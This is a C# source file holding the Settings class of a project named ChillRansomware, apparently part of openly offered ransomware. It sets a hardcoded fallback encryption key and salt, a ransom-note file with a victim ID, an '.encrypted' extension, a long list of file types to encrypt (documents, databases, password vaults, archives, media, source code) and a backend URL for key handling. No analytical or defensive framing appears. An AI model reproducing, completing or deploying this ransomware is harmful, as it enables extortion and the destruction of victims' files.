using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ChillRansomware
{
    class Settings
    {
        //If there is no internet, the ransomware will use a hardcoded encryption key, set this to false
        //to wait until the user has internet access
        public static bool UseLocalKeyIfNoInternet = true;
        public static string HardCodedKey = "1234";
        public static byte[] HardCodedSaltBytes = new byte[] { 38, 91, 212, 38, 91, 212, 38, 91 };
        //Encryption key length, must be higher than 0
        public static int KeyLength = 32;
        //
        public static string MessagePath = "msg.txt";
        public static string[] MessageText = { $"Your unique ID is {Program.user.UUID}", "Line2", "Line3" };

        //When true, it will only encrypt the DebugDirPath
        public static bool DebugMode = false;
        public static string DebugDirPath = Path.Combine(Environment.CurrentDirectory,"TestFolder");
        //Extension for encrypted file, don't forget the .
        public static string Extension = ".encrypted";
        //Extensions to encrypt
        public static string[] ValidExtensions = new[] {
                        ".txt", ".py", ".hc", ".mp4", ".7z", ".flp",".mkv" ,".flac", ".flv", ".dat", ".kdbx" , ".aep" , ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".raw" , ".jpg", ".jpeg" , ".png", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd" , ".pdf" , ".c" , ".cs", ".mp3" , ".mp4", ".js" , ".ts" , ".cpp" , ".zip" , ".rar" , ".mov" , ".rtf" , ".bmp" , ".mkv" , ".avi" , ".iso", ".7-zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".tar", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".kxdb" , ".db"
        };
        //Must include port if it isn't 80 and it isn't a dns
        public static string BackendUrl = "http://127.0.0.1:38912";
    }
}
